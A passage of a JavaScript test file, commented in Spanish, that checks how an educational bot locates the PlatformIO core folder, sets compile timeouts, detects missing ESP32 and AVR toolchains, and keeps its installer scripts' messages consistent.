  assert.equal(mod.coreDir(home, "win32", { PLATFORMIO_CORE_DIR: "" }, nada), "C:\\Users\\docente\\.platformio")
  // Perfil en un servidor: la "raíz" es \\servidor\recurso\, como el splitdrive de Python.
  const unc = "\\\\srv\\perfiles\\ana"
  assert.equal(mod.coreDir(unc, "win32", {}, nada), "\\\\srv\\perfiles\\ana\\.platformio")
  assert.equal(mod.coreDir(unc, "win32", {}, (r) => r === "\\\\srv\\perfiles\\.platformio"), "\\\\srv\\perfiles\\.platformio")
  // USERPROFILE roto: nunca ".platformio" a secas (se resolvería contra la carpeta del proyecto).
  for (const roto of ["", "C:relativo", "docente"]) {
    const r = mod.coreDir(roto, "win32", {}, nada)
    assert.equal(r, "C:\\.platformio", `con home ${JSON.stringify(roto)}`)
  }
  assert.ok(isAbsolute(mod.coreDir("", "linux", {}, nada)), "en Linux, un HOME vacío no puede dar una ruta relativa")
})

test("coreDir(): un C:\\.platformio que es ARCHIVO no cuenta (pio usa isdir, no exists)", () => {
  const raiz = join(OUT, "raiz-falsa")
  rmSync(raiz, { recursive: true, force: true })
  mkdirSync(raiz, { recursive: true })
  const comoWindows = (r) => mod.esCarpeta(join(raiz, r.replace(/^C:\\/, "").replaceAll("\\", "/")))
  try {
    writeFileSync(join(raiz, ".platformio"), "no soy una carpeta")
    assert.equal(existsSync(join(raiz, ".platformio")), true, "existsSync lo da por bueno: por eso no alcanza")
    assert.equal(mod.esCarpeta(join(raiz, ".platformio")), false)
    assert.equal(mod.coreDir("C:\\Users\\ana", "win32", {}, comoWindows), "C:\\Users\\ana\\.platformio")
    rmSync(join(raiz, ".platformio"))
    mkdirSync(join(raiz, ".platformio"))
    assert.equal(mod.esCarpeta(join(raiz, ".platformio")), true)
    assert.equal(mod.coreDir("C:\\Users\\ana", "win32", {}, comoWindows), "C:\\.platformio")
    assert.equal(mod.esCarpeta(join(raiz, "no-existe")), false)
  } finally {
    rmSync(raiz, { recursive: true, force: true })
  }
})

test("timeoutCompilarMs(): TECNIA_PIO_TIMEOUT_MS manda también hacia arriba; si no sirve, se ignora", () => {
  try {
    // Una escuela con red lenta la sube a 10 minutos: se respeta aunque falten herramientas.
    process.env.TECNIA_PIO_TIMEOUT_MS = "600000"
    assert.equal(mod.timeoutCompilarMs(["ESP32"]), 600_000)
    assert.equal(mod.timeoutCompilarMs([]), 600_000)
    for (const basura of ["abc", "0", "-5", ""]) {
      process.env.TECNIA_PIO_TIMEOUT_MS = basura
      assert.equal(mod.timeoutCompilarMs(["ESP32"]), 180_000, `con ${JSON.stringify(basura)} y faltantes`)
      assert.equal(mod.timeoutCompilarMs([]), 900_000, `con ${JSON.stringify(basura)} sin faltantes`)
    }
  } finally {
    delete process.env.TECNIA_PIO_TIMEOUT_MS
  }
})

test("herramientasFaltantes(): ESP32-C3 y S3 con lo suyo bajado no dan un 'faltan' eterno", () => {
  const hay = (...paquetes) => (r) => paquetes.some((p) => r.endsWith(join("packages", p)))
  const ini = (board, platform = "espressif32@6.12.0") => `[env:x]\nplatform = ${platform}\nboard = ${board}\nframework = arduino\n`
  // La C3 compila con toolchain-riscv32-esp y la S3 con toolchain-xtensa-esp32s3:
  // pedirles el compilador del ESP32 clásico era decir "faltan" para siempre.
  assert.deepEqual(mod.herramientasFaltantes(ini("esp32-c3-devkitm-1"), "/core", hay("framework-arduinoespressif32", "toolchain-riscv32-esp")), [])
  assert.deepEqual(mod.herramientasFaltantes(ini("esp32-s3-devkitc-1"), "/core", hay("framework-arduinoespressif32", "toolchain-xtensa-esp32s3")), [])
  // Sin el framework (lo común a todas las variantes) sí faltan.
  assert.deepEqual(mod.herramientasFaltantes(ini("esp32-c3-devkitm-1"), "/core", hay("toolchain-riscv32-esp")), ["ESP32"])
  // El esp32dev del catálogo (lo que deja el instalador) sigue pidiendo su compilador.
  assert.deepEqual(mod.herramientasFaltantes(ini("esp32dev"), "/core", hay("framework-arduinoespressif32")), ["ESP32"])
  assert.deepEqual(mod.herramientasFaltantes(ini("esp32dev"), "/core", hay("framework-arduinoespressif32", "toolchain-xtensa-esp32")), [])
  // AVR: la Micro (Mis Ladrillos) usa el mismo core Arduino que el UNO.
  assert.deepEqual(mod.herramientasFaltantes(ini("micro", "atmelavr@5.2.0"), "/core", hay("toolchain-atmelavr", "framework-arduino-avr")), [])
  assert.deepEqual(mod.herramientasFaltantes(ini("uno", "atmelavr@5.2.0"), "/core", hay("toolchain-atmelavr")), ["Arduino UNO"])
  // Un board con nombre de propiedad de Object no rompe nada.
  assert.deepEqual(mod.herramientasFaltantes(ini("constructor"), "/core", hay("framework-arduinoespressif32")), [])
})

test("mensajeTimeout(): nombra la carpeta real del core y el camino que de verdad baja las herramientas", () => {
  const win = mod.mensajeTimeout("compilar", 180_000, ["ESP32"], "C:\\.platformio", "win32")
  assert.match(win, /Reparar Tecnia Bot/)
  assert.match(win, /Instalar-Tecnia-Bot\.exe/)
  assert.match(win, /`\/actualizar` NO las baja/)
  assert.doesNotMatch(win, /Actualizar Tecnia Bot con buena red/, "/actualizar no baja las herramientas (TECNIA_DESDE_ACTUALIZAR=1)")
  assert.ok(win.includes("adentro de `C:\\.platformio`"), `no nombra el core real: ${win}`)
  assert.doesNotMatch(win, /carpeta del usuario/)
  assert.match(win, /3 minutos/)
  const linux = mod.mensajeTimeout("compilar", 180_000, ["ESP32"], "/home/ana/.platformio", "linux")
  assert.match(linux, /bash install\/install\.sh/)
  assert.ok(linux.includes("/home/ana/.platformio"))
})

test("los instaladores dicen lo mismo que el bot: /actualizar no baja, y el pendrive va al core real", () => {
  const ps1 = readFileSync(join(REPO, "install/install.ps1"), "utf8")
  const sh = readFileSync(join(REPO, "install/install.sh"), "utf8")
  const como = ps1.match(/\$comoConseguirlas = "([^"]+)"/)
  assert.ok(como, "install.ps1 no define $comoConseguirlas")
  assert.match(como[1], /Reparar Tecnia Bot/)
  assert.match(como[1], /Instalar-Tecnia-Bot\.exe/)
  assert.match(como[1], /\/actualizar NO las baja/)
  assert.match(como[1], /adentro de \$core/)
  assert.match(sh, /local como="[^"]*\/actualizar NO las baja[^"]*adentro de \$core\."/)
  // Y el core sale de la regla de PlatformIO, no de la ruta del pio.
  assert.match(ps1, /function Preparar-Placas\(\$pio\) \{\s*\n\s*\$core = Core-PlatformIO/)
  assert.match(ps1, /function Core-PlatformIO \{[\s\S]{0,400}Test-Path -LiteralPath \$enRaiz -PathType Container/)
  assert.doesNotMatch(ps1, /\$core = Split-Path/, "install.ps1 vuelve a sacar el core de la ruta de pio.exe")
  assert.match(sh, /core="\$\{PLATFORMIO_CORE_DIR:-\$HOME\/\.platformio\}"/)
  assert.match(readFileSync(join(REPO, "install/diagnostico.ps1"), "utf8"), /function Core-PlatformIO \{[\s\S]{0,400}-PathType Container/)
})
